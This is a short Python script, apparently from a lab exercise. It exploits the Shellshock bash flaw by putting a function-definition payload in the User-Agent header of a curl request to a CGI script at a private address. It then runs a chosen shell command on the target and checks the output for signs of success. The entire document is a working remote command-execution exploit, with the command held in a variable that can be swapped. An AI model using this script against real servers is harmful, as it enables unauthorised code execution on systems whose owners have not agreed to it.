#!/usr/bin/env python3

import subprocess

url = 'http://192.168.56.111/cgi-bin/shock.sh'
cmd = 'ls -la /tmp'

exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
exploit += '\'' + cmd + '\'"'
exploit += ' ' + url

a = subprocess.run(exploit, shell=True, stdout=subprocess.PIPE).stdout.decode()
print(a)

b = a.strip().split()
print(b)
if '.ICE-unix' in a:
	print('yay')
else:
	print('nay')
